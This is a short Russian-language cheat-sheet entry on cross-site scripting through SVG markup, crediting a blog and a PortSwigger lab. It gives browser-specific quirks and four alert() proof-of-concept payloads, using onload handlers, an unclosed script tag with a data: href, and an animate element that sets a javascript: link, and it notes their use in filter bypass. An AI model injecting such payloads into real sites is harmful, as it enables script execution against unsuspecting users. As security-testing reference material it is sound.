# Через SVG

ист: Bo0oM posts\
SVG - формат графики, который представлен в виде XML файла. Поэтому в нем уже делали всякие атаки, типа XXE. С помощью него выполняются XSS атаки при открытии изображения в браузере. Но еще, он странно ведет себя как тег в html страницах.

Совсем недавно, Safari выполнял событие onload в любом элементе, которое находится в теге svg.

```
<svg><hello onload=alert(1337)>
```

А Firefox умеет выполнять тег , даже если он не закрытый.

```
<svg><script href=data:,alert(1) />
```

На самом деле, при построении DOM-дерева он автоматически закрывает SVG, а для того, чтобы это был корректный XML - все теги внутри него (а еще, ты можешь заметить href, вместо src). Но это можно использовать для обхода некоторых видов защит.

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
   <polygon id="triangle" points="0,0 0,100 100,0" fill="#008800" stroke="#003300"/>
</svg>
```

## SVG+animation

из лабы PortSwigger

```markup
<svg><a>
        <animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text>
    </a>
```
